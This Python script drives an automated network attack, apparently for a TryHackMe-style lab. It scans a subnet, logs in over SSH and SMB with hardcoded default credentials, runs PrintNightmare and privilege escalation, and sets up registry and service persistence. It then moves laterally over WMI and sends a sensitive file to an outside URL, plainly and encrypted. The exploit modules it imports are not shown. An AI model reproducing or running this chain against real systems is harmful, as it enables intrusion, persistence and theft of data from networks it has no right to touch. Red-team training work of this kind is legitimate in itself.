import os
from modules.recon import scan_network, choose_attack
from modules.priv_esc import linux_priv_esc, windows_priv_esc
from modules.persistence import create_registry_persistence, create_windows_service
from modules.lateral_movement import smb_lateral_movement, wmi_lateral_movement
from modules.data_exfiltration import exfiltrate_via_http, exfiltrate_encrypted
from modules.report_generator import generate_report
from utils.config import map_to_mitre
from modules.exploitation import exploit_ssh, exploit_smb, exploit_printnightmare
from utils.handle import error_handling_wrapper

# Global configuration
exfil_server_url = "https://tryhackme.com/dashboard"
key = b'Sixteen byte key'

def main():
    # Step 1: Reconnaissance
    print("Starting network scan...")
    target_network = "192.168.216.0/24"
    targets = scan_network(target_network)

    if not targets:
        print("No active targets found on the network. Exiting.")
        return

    for target in targets:
        # Step 2: Attack Logic (Decision-making based on scan results)
        attack_type = choose_attack(target)

        if attack_type == "ssh":
            print(f"Performing SSH-based attack on {target['ip']}")
            # Step 3: Exploitation (SSH-based Exploitation)
            error_handling_wrapper(exploit_ssh, target['ip'], "root", "password")  # Replace with actual creds or attack method

        elif attack_type == "smb":
            print(f"Performing SMB-based attack on {target['ip']}")
            # Step 3: Exploitation (SMB-based Exploitation)
            error_handling_wrapper(exploit_smb, target['ip'], "admin", "password")

            # Windows-specific Privilege Escalation (Optional)
            error_handling_wrapper(exploit_printnightmare, target['ip'])  # PrintNightmare exploitation

        # Step 4: Privilege Escalation (Based on the target OS)
        os_type = target.get('os', 'unknown')  # Default to 'unknown' if 'os' key is missing
        if os_type == "linux":
            error_handling_wrapper(linux_priv_esc)
        elif os_type == "windows":
            error_handling_wrapper(windows_priv_esc)

        # Step 5: Persistence (Registry and Services)
        if os_type == "windows":
            error_handling_wrapper(create_registry_persistence)
            error_handling_wrapper(create_windows_service)

        # Step 6: Lateral Movement (WMI for Windows)
        if os_type == "windows":
            error_handling_wrapper(wmi_lateral_movement, target['ip'], "admin", "password")

        # Step 7: Data Exfiltration (Basic or Encrypted)
        sensitive_file_path = "sensitive_data.txt"
        exfiltrate_via_http(sensitive_file_path, exfil_server_url)
        # or use encrypted exfiltration
        exfiltrate_encrypted(sensitive_file_path, key, exfil_server_url)

    # Step 8: Dynamic Report Generation
    report_data = [
        f"Attack completed on {target_network}",
        "Targets exploited: " + ", ".join([t['ip'] for t in targets])
    ]
    generate_report(report_data)

    # Step 9: MITRE ATT&CK Mapping
    tactic = "lateral_movement"
    print(f"Lateral Movement maps to MITRE ATT&CK ID: {map_to_mitre(tactic)}")

if __name__ == "__main__":
    main()
